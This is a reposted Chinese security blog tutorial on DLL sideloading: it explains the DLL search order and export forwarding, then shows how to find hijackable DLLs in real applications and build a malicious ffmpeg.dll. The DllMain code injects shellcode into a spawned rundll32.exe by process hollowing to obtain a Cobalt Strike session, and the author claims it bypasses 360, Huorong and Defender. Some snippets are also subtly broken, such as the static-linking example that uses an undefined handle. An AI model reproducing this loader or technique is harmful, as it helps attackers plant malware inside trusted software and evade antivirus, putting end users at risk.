<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/fGKOErh5NIS2ntOxYIjmEw)

朋友们现在只对常读和星标的公众号才展示大图推送，建议大家把 “**亿人**安全**** “**设为星标**”，否则可能就看不到了啦

**原文链接：先知社区  
**

https://xz.aliyun.com/t/14558

简单来说就是通过白名单的 exe 运行来去加载恶意的 dll 达到 shellcode 加载的目的，那么就需要对 exe 加载的 dll 进行了解。

0x01 DLL 前置知识
-------------

### DLL 路径搜索目录顺序

• 1. 程序所在目录  
• 2. 程序加载目录（SetCurrentDirectory）  
• 3. 系统目录即 SYSTEM32 目录  
• 4.16 位系统目录即 SYSTEM 目录  
• 5.Windows 目录  
• 6.PATH 环境变量中列出的目录  
Know DLLs 注册表项  
Know DLLs 注册表项里的 DLL 列表在应用程序运行后就已经加入到了内核空间中，多个进程公用这些模块，必须具有非常高的权限才能修改。  
Know DLLs 注册表项的路径为 HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs  
劫持应用中存在的 dll

#### 直接转发 Direcrt Forwarding

直接转发对主程序来说，其实就是调用了原来 dll 的某个函数。  
1. 修改导出表  
在导出表中，将要转发的函数入口地址指向另一个 DLL 对应函数的入口地址  
2. 实际调用过程  
其他程序调用 DLL 中被转发的函数时，系统会重定向到转发目标 DLL 中的对应函数。  
设 DLL A 中的函数 MyFunction() 被直接转发到 DLLB 中的函数 RealFunction()，那么调用 MyFunction() 实际上会调用 RealFunction()。

#### 及时调用 Delay Load and Call

即时调用实际上是调用了劫持 dll 的某个函数，只不过那个函数会 jmp 到原本的 dll 中的相应函数的地址。达到的效果相同，但是实现的原理不同。

1.  延迟加载目标 DLL  
    当 DLL A 中的函数被调用时，首先使用 LoadLibrary 加载目标 DLLB。
    
2.  获取函数入口地址  
    然后使用 GetProcAddress 获取目标 DLL 中要调用的函数的入口地址。
    
3.  实际调用过程：  
    使用获取到的函数入口地址调用目标函数。  
    这种方式的优点是，可以在需要调用函数时才加载目标 DLLB.  
    注意事项  
    不管是转发还是劫持，都需要注意使用对应位数的 shellcode，可以使用 01Eidor 来打开 exe 查看，生成 dll 时候也需注意。  
    DllMain 入口函数  
    这是动态链接库的可选入口点。系统启动或终止进程或线程的时候，它会使用进程的第一个线程为每个加载的 DLL 来调用入口点函数。  
    当 Dll 使用 LoadLibrary 加载和使用 FreeLibrary 函数卸载 dll 时候，系统还会回调该函数的入口点函数。
    

```
/*
* hModule：DLL模块句柄
* ul_reason_for_call：调用函数的原因
* lpReserved：保留参数
*/
BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
      case DLL_PROCESS_ATTACH: // 当DLL被进程加载时执行，每个新进程只初始化一次。
      case DLL_THREAD_ATTACH: // 当线程被创建时调用
      case DLL_THREAD_DETACH: // 当线程结束时执行
      case DLL_PROCESS_DETACH: // 当DLL被进程卸载时执行
            if (lpvReserved != nullptr)
            {
                break; // lpvReserved为非空时，表示进程被终止，不做任何清理
            }
            // 执行必要的清理
          break;
    }
    return TRUE; // DLL_PROCESS_ATTACH成功
}


```

DLL_PROCESS_ARRACH  
当一个 dll 文件被映射到进程的地址空间时，系统调用 dllmain，传递 fdwReason 参数为 DLL_PROCESS_ARRACH, 只会被传递一次。  
DLL_PROCESS_DETACH  
当 dll 被从进程的地址空间接触映射时调用  
比如：  
1. 调用 FreeLibray()  
2. 进程结束  
3. 传入 DLL_PROCESS_ATTACH 的 dllmain 返回 False  
DLL_PROCESS_ATTACH  
当进程创建一线程调用时，与 DLL_PROCESS_ATTACH 不同，该值可以被多次调用。

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqibtc9p0TezbnYHDIswIsl8RHnJSXrsQiblBwOpQUHNQfLDWQN9C4z0hkib8LJ23yAdghh8RST3Tw1w/640?wx_fmt=png&from=appmsg)

DllMain 函数名修饰 - APIENTRY

```
#define CALLBACK __stdcall   // WIN32编程中的回调函数类型
#define WINAPI __stdcal
#define WINAPIV __cdecl
#define APIENTRY WINAPI   // DllMain的入口就在这里
#define APIPRIVATE __stdcall
#define PASCAL __stdcall


```

APIENTRY 根据宏定义 WINAPI 以及 **stdcall，可知是属于** stdcall 调用约定。  
这种约定主要约束了两件事：参数传递顺序、调用堆栈由谁清理 (调用函数或被调用函数)。  
常见的函数调用约定有：**cdecl** stdcall **fastcall** thiscall  
其中 **cdecl 是 C\C++ 的默认调用约定，**stdcall 是 Windows API 的默认调用约定。  
Dll 的调试  
这里写一个例子来进行 dll 的开发和调试  
pch.h 对应的源文件

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqibtc9p0TezbnYHDIswIsl8PB9qWYAiamby865H1AqibgeravLIcfvsuWQ5RYRTRLMYe0C7Mmqk45Gw/640?wx_fmt=png&from=appmsg)

  
这段代码定义了一个 study_dll_EXPORTS 的宏，定义 API_DECLSPECKM 为 **declspec(dllexport)，否则则定义 API_DECLSPECKM 为** declspec(dllimport)

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqibtc9p0TezbnYHDIswIsl8OOtcQ4BVSLbpwWrMlIkNv1xfqw7RZUoCJWxfafepaoJvTnb4BH8niaQ/640?wx_fmt=png&from=appmsg)

生成 dll 后在用 dumpbin 来查看导出表，注意 dumpbin 要找到对应位数这里是 64 位，不要用成 arm 的了

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqibtc9p0TezbnYHDIswIsl8MDSRFtAvJ56CV9IblhyMeWequRMoPWsCibOjQqZOqOrtTAlusLdMLPw/640?wx_fmt=png&from=appmsg)

这里学习一下调用 dll 来调试 dll 中的代码。  
首先需要可以调用这个 dll 的 exe，这点很重要。  
创建一个控制台项目，然后代码里面加载 dll，获取到 HModule 后，在用 GetProcAddress 来获取 dll 里面的方法

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqibtc9p0TezbnYHDIswIsl8WLvT3fkfxb7A63yzNXqPxJ8o6TRLe41NMjib9icWcMT0TO7MhmlDutpQ/640?wx_fmt=png&from=appmsg)

这里再 return 这下断点 可以看到调试成功了

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqibtc9p0TezbnYHDIswIsl8b402Xcp8h0qWfHI2eqC4micma1W5LUcn9DZNgdibniaBUbl2FibFczGFVA/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqibtc9p0TezbnYHDIswIsl8icCoxjYSZkLibg3A3lwZToX2cq0IHj08Ruw2340FvZFuUVcPhyOshn2A/640?wx_fmt=png&from=appmsg)

0x02 dll 静态和动态调用的特点
-------------------

dll 静态调用特点  
程序在编译时将所需的 dll 文件嵌入到可执行文件中，也就是 dll 文件与可执行文件捆绑在一起。  
当程序运行时，操作系统会将静态链接库（Static Link Library）中的代码和数据复制到程序的内存空间中，这样程序就可以直接使用 DLL 中的功能。由于 DLL 文件已经被嵌入到可执行文件中，因此程序在运行时不需要再加载 DLL 文件，可以直接执行。  
示例 编写一个静态 dll 文件 mydll.lib

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqibtc9p0TezbnYHDIswIsl8ufoZg8KkPdTfWLKJwiaP5sIxDU1lT2CjQRqAkyicX8HiaibuocQEyhdYaQ/640?wx_fmt=png&from=appmsg)

```
// 定义 DLL 导出函数的原型
typedef int (*DLLFUNC)(int);

int main()
{
    // 加载静态链接库
    #pragma comment(lib, "mydll.lib")

    // 获取 DLL 导出函数指针
    DLLFUNC MyFunc = (DLLFUNC)GetProcAddress(hLib, "MyFunc");

    // 调用 DLL 导出函数
    int result = MyFunc(123);

    return 0;
}


```

dll 动态调用的特点  
如果所需要 dll 不存在，不会返回错误代码 (除非在代码里面写了 Getlasterror 这些)

0x03 dllmain 上线问题
-----------------

根据微软官方文档，不能在 DllMain 中调用直接或间接尝试获取加载程序锁的任何函数，否则将导致死锁，这意味着不能使用 Sleep(Ex)、WaitForSingleObject 等有等待延迟的函数，此外微软还列举了 DllMain 中不能使用的一些函数如直接或间接使用 LoadLibrary(Ex)、GetStringTypeA 等，CreateProcess 和 CreateThread 可以调用但存在风险：

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqibtc9p0TezbnYHDIswIsl8SDVYW9laHs82m7kI6R8yDJJbticB1hoplRmIsarg3EBib7PibITNNtXpQ/640?wx_fmt=png&from=appmsg)

dllmain 里面不能创建进程这个问题是一个坑。  
也就是说创建线程申请内存加载 shellcode 需要在导出函数里面操作，不能再 dllmain 里面直接操作，需要找到第一个执行的函数就能行，但是麻烦，我们可以可以新定义一个函数来申请内存，加载到内存中，在 dllmain 中只需要去用 CreateThread 来调用它就可以了。

0x04 寻找可用 dll
-------------

这是一个关键性的问题，可执行文件的导入 dll 那么多，用哪个 dll 来加黑呢？这个可以说是最关键的一步！  
一般我们能利用的 dll 都是特殊的 dll，无论 SafeDllSearchMode 是否开启最终都是在当前路径之下搜索。  
这里来罗列一下几种方法

### 1. 孤独寻找

最容易想到的操作，就是把 exe 单独移动出来，然后运行看看报错是什么，这里报错是缺少 ffmpeg.dll,  
但是这种方法不保证管用和准确性。

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqibtc9p0TezbnYHDIswIsl8O2EPiaFhia4lazSfWDLiaeL5CPjbC0lk9oQ85riaWoUcJyKvRDu7LYHyug/640?wx_fmt=png&from=appmsg)

100 多 MB 的启动程序导入表 dll 居然这么少  
通过查看导入表，来判断排除系统 dll，然后看看在结合目录寻找软件的 dll

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqibtc9p0TezbnYHDIswIsl8XSsZqT8GMOpGiacjs9V97zJOo3BtAFsKDO1xKDdkM4uIwjl7Gxzz4dA/640?wx_fmt=png&from=appmsg)

有些程序光是一个 dll 还无法正常打开运行，可能是 dll1 还需要 dll2，这种就不好去找了。有些能运行上线，但是程序无法正常使用，想要劫持了 dll 加黑，又要原程序正常运行这是一件很难的事情。

### 2.Procmon 助我

使用 Procmon 任务管理器来动态运行程序查找，可以逐步分析需要动态加载哪些关键 DLL。  
先来一个 Filter

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqibtc9p0TezbnYHDIswIsl8OQbUBHkkOcuibXrAWuK2YOxXyuFe82RShnicPvFpDxsRcWMpxEvM5ajA/640?wx_fmt=png&from=appmsg)

内容还是太多了，需要再过滤一下，只看 dll 的

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqibtc9p0TezbnYHDIswIsl8BarnxniboDI0s3ISWpP2pHb6G1XFFpuZfqeW4Ku2JhTZVpQD6UUoDIg/640?wx_fmt=png&from=appmsg)

加上 path 以. dll 结尾的过滤器

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqibtc9p0TezbnYHDIswIsl8jwezHsutm7RRJaNXbARRFD4RREDk5f0HfeqJf8pIdQEYQ76ibRic4YiaA/640?wx_fmt=png&from=appmsg)

再加上一个 exclude，就可以排除完了

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqibtc9p0TezbnYHDIswIsl8z44ksn6AYralKkffSYpPbKNXicibQlIWdhhiczOp62XxPxjQFRonX4Hicg/640?wx_fmt=png&from=appmsg)

### 3. 巧用工具

寻找了好几款工具，对比测试发现 ZeroEye 效果还不错

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqibtc9p0TezbnYHDIswIsl84khSMbzKqmreInKeH5k3fqY8SxsYMWzZL921Nju4W9uhgmMRcJLAuQ/640?wx_fmt=png&from=appmsg)

利用工具来检查可以被劫持的 dll，可以快速排除寻找  
https://github.com/ImCoriander/ZeroEye/tree/ZeroEye  
这款工具 python 运行调用 PE 程序去寻找，成功找到后会生成对应目录

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqibtc9p0TezbnYHDIswIsl8zcs9Lb2Q1Lxjia2Y4q31BM0g8yf1zF6eQckyuEqZEx0iakzWQIKru1qw/640?wx_fmt=png&from=appmsg)

这里给出了 exe 的导入 DLL，分成系统 DLL 和程序的 DLL，一目了然，比如寻找 wyy 的

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqibtc9p0TezbnYHDIswIsl8xib5KvrkDNcK26JaORg0aTbDpKIzNxJUY9Hwl0csDnBibrEd4TlX47hQ/640?wx_fmt=png&from=appmsg)

cloudmusic_util.exe 这里导入依赖了很多 dll

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqibtc9p0TezbnYHDIswIsl8xaLPfMkVK5oia5tE8cys7AiafTPgGhyweZ9ctnHlEAKwnC5ufuiaqeONg/640?wx_fmt=png&from=appmsg)

这里还差一个 dll，我们手动排查发现

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqibtc9p0TezbnYHDIswIsl8Y5dNlVJ1lkHZVDNv0rGF5FjNuvJ7BOB4H7UiaeobY2IdnfUaZYS2QoA/640?wx_fmt=png&from=appmsg)

那么在给他加上 libFLAC_dynamic.dll 就可以直接运行了

黑 Dll 制作
--------

我这里测试，就选择这个某哔哩 ffmpeg.dll 来制作。  
用 AheadLib 来做 dll 的相关函数导出，但是之前的这个软件导出 x64 位的 dll 就会直接闪退，没办法，已经没有更新了

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqibtc9p0TezbnYHDIswIsl8pMK1iayuPwTQUya2kEMD4NQCNxXTdVhJllUXwcOWdy95gZ9WJUBd5xw/640?wx_fmt=png&from=appmsg)

在 GitHub 上找到了一个可以用的，但是导出之后需要把 asm 相关函数编译成 obj，比较麻烦  
https://github.com/strivexjun/AheadLib-x86-x64  
导出转发生成了 ffmpeg_jump.asm 和 ffmpeg.cpp 文件

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqibtc9p0TezbnYHDIswIsl86ianfCuDSBh8jia3ZIOjjCqg0GXCNandkd3Yfn5J79dicBicnwEcoKcQ2g/640?wx_fmt=png&from=appmsg)

编译的时候就发现存在两个函数的报错，尝试了很久，添加链接器到 Shlwapi.h 物理路径也不行，就很奇怪  
shlwapi.h 已经引用 找不到 pathstrippath” 和 “strcmpi”

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqibtc9p0TezbnYHDIswIsl8BwwSrMaxXib52viaGtTPLRgfSu5hHsIRCSKF7tkZyKicrdZmqos5g5Zhw/640?wx_fmt=png&from=appmsg)

没有用，只能尝试替换掉这两个函数了

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqibtc9p0TezbnYHDIswIsl8FsnKBLdL8zwIANAfdianribmhtQWdlx3a2YSmQ2ib9zmqI5sMVoOKkficA/640?wx_fmt=png&from=appmsg)

当然可以用其他的轮子来加载 dllmain  
(由于 dll 被修改后哔哩打开就闪退了，之前那个是在 dllmain 中调用函数来创建线程，所以闪退会导致 CS 这边也退掉)  
想要保持修改 dll 后的软件 exe 也能正常运行打开，不是那么好做，是比较困难的，条件要求很高。那么可以考虑换一种方法来执行。  
注入进程，一种常用的轮子

```
unsigned char payload[] = "\xfc\xe8...";
unsigned int payload_len = sizeof payload - 1;

BOOL APIENTRY DllMain(HMODULE hModule,
  DWORD  ul_reason_for_call,
  LPVOID lpReserved
)
{
  switch (ul_reason_for_call)
  {
  case DLL_PROCESS_ATTACH: {
    char* v7A = (char*)VirtualAlloc(0, payload_len, 0x3000u, 0x40u);
    memcpy((void*)v7A, payload, payload_len);

    struct _PROCESS_INFORMATION ProcessInformation;
    struct _STARTUPINFOA StartupInfo;
    void* v24;
    CONTEXT Context;
    memset(&StartupInfo, 0, sizeof(StartupInfo));
    StartupInfo.cb = 68;
    BOOL result = CreateProcessA(0, (LPSTR)"rundll32.exe", 0, 0, 0, 0x44u, 0, 0, &StartupInfo, &ProcessInformation);
    if (result)
    {
      Context.ContextFlags = 65539;
      GetThreadContext(ProcessInformation.hThread, &Context);
      v24 = VirtualAllocEx(ProcessInformation.hProcess, 0, payload_len, 0x1000u, 0x40u);
      WriteProcessMemory(ProcessInformation.hProcess, v24, v7A, payload_len, NULL);
            // 32 位使用 Context.Eip = (DWORD_PTR)v24;
      Context.Rip = (DWORD_PTR)v24;
      SetThreadContext(ProcessInformation.hThread, &Context);
      ResumeThread(ProcessInformation.hThread);
      CloseHandle(ProcessInformation.hThread);
      result = CloseHandle(ProcessInformation.hProcess);
    }

    TerminateProcess(GetCurrentProcess(), 0);
  }

  case DLL_THREAD_ATTACH:
  case DLL_THREAD_DETACH:
  case DLL_PROCESS_DETACH:
    break;
  }
  return TRUE;
}


```

ok 代码的问题解决了，但是再编译的时候出现了上面的导出函数无法被识别的问题

这里就需要来编译 asm 文件了，参考 asm 注释里面给的命令，需要注意 ml64 是 vsstudio 里面的文件，因为这里没有加入到环境变量中，所以写全路径，编译得到了 ffmpeg_jump.obj  
"E:\C project\Microsoft Visual Studio\VC\Tools\MSVC\14.16.27023\bin\HostX64\x64\ml64" /Fo ffmpeg_jump.obj /c /Cp ffmpeg_jump.asm

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqibtc9p0TezbnYHDIswIsl8AUlhz6P8A8AiaqQibb4aLFc9Tuk2tgZd3VWV1ictib1ONiargDbSO8G6EWg/640?wx_fmt=png&from=appmsg)

把 ffmpeg_jump.obj 复制到项目目录下

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqibtc9p0TezbnYHDIswIsl8Z8qV9vbZKJxhsEMVt9jDQ9fwgV4bpXaKHObKCPElfIK3XQHibLHLHwA/640?wx_fmt=png&from=appmsg)

然后把 obj 文件添加到链接器里面

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqibtc9p0TezbnYHDIswIsl8yYWiaEploFxlkKC1MQiap0iaU5lGaPGqwvX2s8yuRbzmhVFAS2XhZBmQg/640?wx_fmt=png&from=appmsg)

放回到安装目录可以上线，这里是启动了 rundll32.exe 来上线的

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqibtc9p0TezbnYHDIswIsl8k8oMkwyA5qTYujIAqckoQbC1sMliamF49xHebz5BCicLJnNVYNg9DDCQ/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqibtc9p0TezbnYHDIswIsl8KHbJosamy9MpXgSXNJjvjAUpgMliaPWDkWYa5GhqBicgjyV5pm6nSV7w/640?wx_fmt=png&from=appmsg)

这样子单独拎出来也可以上线，不过还没有做免杀

再加上一点自己的免杀手段上去，这里就不继续展开了  
360，火绒，defender 通通 bypass！  
放一下 defender 免杀效果图  
defender 静态查杀  

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqibtc9p0TezbnYHDIswIsl8nUwO0nnICM19UTvLFEmsajY282OrmULHtZPapGKXjxSNmczuf6v3bw/640?wx_fmt=png&from=appmsg)

defender 动态查杀  

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqibtc9p0TezbnYHDIswIsl8h0Mib5CiatjmpDNDVSQUVrgibqs2ibrIUKdicdK5T7Cq5cicXYaXW64uVUicA/640?wx_fmt=png&from=appmsg)

参考链接：  
https://www.freebuf.com/articles/system/333690.html  
https://github.com/strivexjun/AheadLib-x86-x64  
https://learn.microsoft.com/zh-cn/windows/win32/dlls/dynamic-link-library-best-practices?redirectedfrom=MSDN  
https://github.com/ImCoriander/ZeroEye/tree/ZeroEye